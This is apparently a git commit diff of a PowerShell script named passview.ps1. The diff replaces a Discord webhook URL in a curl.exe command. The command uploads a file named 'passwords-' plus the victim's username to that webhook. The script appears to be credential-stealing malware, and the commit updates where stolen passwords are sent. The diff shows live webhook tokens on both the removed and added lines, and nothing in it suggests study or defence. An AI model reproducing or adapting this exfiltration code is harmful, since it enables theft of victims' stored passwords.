a8acd0172e8e5551cd661bde8a8bdfe9bda45762
blousekool <132397759+blousekool@users.noreply.github.com>
2025-05-21 11:47:05 +0200

    Update passview.ps1

--- passview.ps1
+++ passview.ps1
@@ -10,7 +10,7 @@ Set-Location C:\fileUp
 
 Start-Sleep -seconds 15
 
-curl.exe -F "payload_json={\`"content\`": \`"\`"}" -F "file=@passwords-$env:UserName$random.txt" https://discord.com/api/webhooks/1367052138370306099/pXCK91ZVAtSlsArlLMW9Sc1gMn5EJwJ8j98cW2WTCPIDqlHMjDn0RKSRxz9Ee5h1qyed
+curl.exe -F "payload_json={\`"content\`": \`"\`"}" -F "file=@passwords-$env:UserName$random.txt" https://discord.com/api/webhooks/1374684800430112889/oAzFkhzV7z45YCtLCpG5nUehUawgv4yH4ZnMYljCLt0RNwIJaUjNyQOGZj6AfEP31zBP
 
 Start-Sleep -seconds 1
 
